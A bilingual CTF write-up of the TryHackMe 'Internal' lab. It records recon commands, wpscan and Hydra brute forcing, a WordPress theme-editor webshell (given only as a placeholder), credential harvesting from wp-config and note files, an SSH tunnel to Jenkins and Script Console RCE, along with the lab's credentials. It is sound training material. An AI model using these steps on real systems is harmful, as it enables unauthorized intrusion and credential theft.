# TryHackMe - Internal

## Target Metadata

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Hard |
| OS | Linux + Docker |
| Domain | `internal.thm` |
| Key services | WordPress, SSH, Jenkins in Docker |

## Attack Chain Overview

```text
Web recon -> WordPress user enum -> WPScan brute-force admin
  -> theme editor webshell
  -> www-data shell
  -> wp-config.php and /opt credential discovery
  -> SSH as aubreanna
  -> SSH local forward to Jenkins container
  -> Jenkins brute force
  -> Script Console RCE
  -> container secret hunting
  -> root SSH password
```

## Resumen en Espanol

Internal empieza con WordPress en `/blog`. `nuclei` y `wpscan` confirmaron WordPress, XML-RPC y el usuario `admin`; con `wpscan` se obtuvo la password `my2boys`. Desde el panel admin se edito `404.php` del tema para convertirlo en una webshell y conseguir ejecucion como `www-data`.

La primera pivot de usuario salio de enumerar archivos locales: `wp-config.php` dio credenciales de MySQL, pero la pista real estaba en `/opt/wp-save.txt`, donde aparecian credenciales de `aubreanna`. Con SSH se descubrio Jenkins interno en `172.17.0.2:8080`, se tunelizo con `ssh -L`, se hizo fuerza bruta al formulario y la Script Console dio RCE dentro del contenedor. Finalmente, `/opt/note.txt` contenia la password de root.

## English Summary

Internal starts with WordPress under `/blog`. `nuclei` and `wpscan` confirmed WordPress, XML-RPC, and the `admin` user; `wpscan` brute force recovered `admin:my2boys`. The WordPress theme editor was used to replace `404.php` with a PHP webshell and gain command execution as `www-data`.

Local enumeration found WordPress DB credentials, but the useful pivot was `/opt/wp-save.txt`, which leaked `aubreanna`'s password. SSH as `aubreanna` revealed Jenkins on `172.17.0.2:8080`. A local SSH tunnel exposed Jenkins, Hydra recovered `admin:spongebob`, and Jenkins Script Console gave a container shell. Secret hunting inside the container revealed the root SSH password.

## Reconnaissance

Tools: [nmap](../../tools/recon/nmap.md), [feroxbuster](../../tools/fuzz/feroxbuster.md), [nuclei](../../tools/recon/nuclei.md), [wpscan](../../tools/web/wpscan.md).

```bash
# What it does: runs an Nmap scan with the specified ports/scripts/options.
# Why here: identify exposed services and decide on the next enumeration.
nmap -sS -p- --open -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p22,80 $TARGET -oN service
# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
# Why here: descubrir endpoints ocultos que abren la siguiente fase.
feroxbuster -u http://internal.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
nuclei -target http://internal.thm/
wpscan --url http://internal.thm/blog -e vp,u
```

## Initial Access

Full technique: [WordPress theme editor webshell](../../exploits/web-rce/wordpress-theme-editor-webshell.md).

```bash
wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

Edit the theme `404.php` with `PHP_WEBSHELL_PAYLOAD`, then call it with a command or reverse-shell payload.

## User Pivot

Full technique: [WordPress wp-config.php credential reuse](../../exploits/creds/wordpress-wp-config-credentials.md).

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /var/www/html/wordpress/wp-config.php | grep -E "DB_|host|port"
# What it does: usa un cliente o herramienta de volcado de base de datos.
# Why here: enumerar datos y extraer credenciales o estado de la app.
mysql -h localhost -u wordpress -pwordpress123 wordpress
# What it does: changes the current directory.
# Why here: position in the necessary path for the next command.
cd /opt/
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat wp-save.txt
# What it does: opens an SSH session or tunnel with the specified options.
# Why here: obtain interactive shell or pivot to an internal service.
ssh aubreanna@$TARGET
```

## Jenkins Pivot

Full techniques: [Jenkins HTTP form brute force](../../exploits/creds/jenkins-http-form-bruteforce.md), [Jenkins Script Console RCE](../../exploits/web-rce/jenkins-script-console-rce.md).

```bash
# What it does: opens an SSH session or tunnel with the specified options.
# Why here: obtain interactive shell or pivot to an internal service.
ssh -L 8080:172.17.0.2:8080 aubreanna@$TARGET
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Use `/script` with the Groovy reverse shell from the Jenkins note.

## Root

Full technique: [Docker container secret hunting](../../exploits/container/docker-container-secret-hunting.md).

```bash
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /proc/self/status | grep -E '^Cap'
# What it does: muestra el hostname actual.
# Why here: distinguir si la shell esta en host, contenedor o nodo pivote.
hostname
# What it does: monta un sistema de archivos remoto o local.
# Why here: inspeccionar archivos como si estuvieran en local.
mount | grep -E 'overlay|aufs'
# What it does: searches the filesystem with the specified filters.
# Why here: locate credentials, binaries, configs or writable paths.
find / -name "*.txt" 2>/dev/null | grep -v proc
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /opt/note.txt
# What it does: opens an SSH session or tunnel with the specified options.
# Why here: obtain interactive shell or pivot to an internal service.
ssh root@$TARGET
```

## Key Takeaways

- ES: WordPress admin suele ser RCE si el theme editor esta activo.
- EN: WordPress admin often means RCE when the theme editor is enabled.
- ES: Servicios Docker internos se vuelven accesibles con `ssh -L`.
- EN: Internal Docker services become reachable with `ssh -L`.
- ES: Jenkins admin + Script Console equivale a ejecucion de comandos.
- EN: Jenkins admin plus Script Console equals command execution.

## Related Notes

- [nmap](../../tools/recon/nmap.md)
- [feroxbuster](../../tools/fuzz/feroxbuster.md)
- [nuclei](../../tools/recon/nuclei.md)
- [wpscan](../../tools/web/wpscan.md)
- [hydra](../../tools/creds/hydra.md)
- [ssh](../../tools/pivot/ssh.md)
- [WordPress theme editor webshell](../../exploits/web-rce/wordpress-theme-editor-webshell.md)
- [WordPress wp-config.php credential reuse](../../exploits/creds/wordpress-wp-config-credentials.md)
- [Jenkins HTTP form brute force](../../exploits/creds/jenkins-http-form-bruteforce.md)
- [Jenkins Script Console RCE](../../exploits/web-rce/jenkins-script-console-rce.md)
- [Docker container secret hunting](../../exploits/container/docker-container-secret-hunting.md)


